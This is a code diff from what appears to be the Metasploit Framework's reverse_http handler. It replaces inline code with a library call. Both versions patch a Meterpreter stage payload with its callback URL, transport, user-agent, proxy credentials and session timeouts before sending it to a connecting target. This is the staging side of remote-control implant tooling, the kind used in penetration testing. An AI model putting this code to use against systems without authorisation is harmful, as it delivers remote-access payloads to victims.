@@ -2,6 +2,7 @@
 require 'rex/io/stream_abstraction'
 require 'rex/sync/ref'
 require 'msf/core/handler/reverse_http/uri_checksum'
+require 'rex/payloads/meterpreter/patch'
 
 module Msf
 module Handler
@@ -257,86 +258,28 @@ protected
         })
 
       when /^\/A?INITM?/
-        url = ''
+        conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
+        url = payload_uri + conn_id + "/\x00"
 
         print_status("#{cli.peerhost}:#{cli.peerport} Staging connection for target #{req.relative_resource} received...")
         resp['Content-Type'] = 'application/octet-stream'
 
         blob = obj.stage_payload
 
-        # Replace the user agent string with our option
-        i = blob.index("METERPRETER_UA\x00")
-        if i
-          str = datastore['MeterpreterUserAgent'][0,255] + "\x00"
-          blob[i, str.length] = str
-          print_status("Patched user-agent at offset #{i}...")
-        end
-
-        # Activate a custom proxy
-        i = blob.index("METERPRETER_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
-        if i
-          if datastore['PROXYHOST']
-            if datastore['PROXYHOST'].to_s != ""
-              proxyhost = datastore['PROXYHOST'].to_s
-              proxyport = datastore['PROXYPORT'].to_s || "8080"
-              proxyinfo = proxyhost + ":" + proxyport
-              if proxyport == "80"
-                proxyinfo = proxyhost
-              end
-              if datastore['PROXY_TYPE'].to_s == 'HTTP'
-                proxyinfo = 'http://' + proxyinfo
-              else #socks
-                proxyinfo = 'socks=' + proxyinfo
-              end
-              proxyinfo << "\x00"
-              blob[i, proxyinfo.length] = proxyinfo
-              print_status("Activated custom proxy #{proxyinfo}, patch at offset #{i}...")
-              #Optional authentification
-              unless (datastore['PROXY_USERNAME'].nil? or datastore['PROXY_USERNAME'].empty?) or
-                (datastore['PROXY_PASSWORD'].nil? or datastore['PROXY_PASSWORD'].empty?) or
-                datastore['PROXY_TYPE'] == 'SOCKS'
-
-                proxy_username_loc = blob.index("METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
-                proxy_username = datastore['PROXY_USERNAME'] << "\x00"
-                blob[proxy_username_loc, proxy_username.length] = proxy_username
-
-                proxy_password_loc = blob.index("METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
-                proxy_password = datastore['PROXY_PASSWORD'] << "\x00"
-                blob[proxy_password_loc, proxy_password.length] = proxy_password
-              end
-            end
-          end
-        end
-
-        # Replace the transport string first (TRANSPORT_SOCKET_SSL)
-        i = blob.index("METERPRETER_TRANSPORT_SSL")
-        if i
-          str = "METERPRETER_TRANSPORT_HTTP#{ssl? ? "S" : ""}\x00"
-          blob[i, str.length] = str
-        end
-        print_status("Patched transport at offset #{i}...")
-
-        conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
-        i = blob.index("https://" + ("X" * 256))
-        if i
-          url = payload_uri + conn_id + "/\x00"
-          blob[i, url.length] = url
-        end
-        print_status("Patched URL at offset #{i}...")
-
-        i = blob.index([0xb64be661].pack("V"))
-        if i
-          str = [ datastore['SessionExpirationTimeout'] ].pack("V")
-          blob[i, str.length] = str
-        end
-        print_status("Patched Expiration Timeout at offset #{i}...")
-
-        i = blob.index([0xaf79257f].pack("V"))
-        if i
-          str = [ datastore['SessionCommunicationTimeout'] ].pack("V")
-          blob[i, str.length] = str
-        end
-        print_status("Patched Communication Timeout at offset #{i}...")
+        #
+        # Patch options into the payload
+        #
+        Rex::Payloads::Meterpreter::Patch.patch_passive_service! blob,
+          :ssl            => ssl?,
+          :url            => url,
+          :expiration     => datastore['SessionExpirationTimeout'],
+          :comm_timeout   => datastore['SessionCommunicationTimeout'],
+          :ua             => datastore['MeterpreterUserAgent'],
+          :proxyhost      => datastore['PROXYHOST'],
+          :proxyport      => datastore['PROXYPORT'],
+          :proxy_type     => datastore['PROXY_TYPE'],
+          :proxy_username => datastore['PROXY_USERNAME'],
+          :proxy_password => datastore['PROXY_PASSWORD']
 
         resp.body = encode_stage(blob)
 
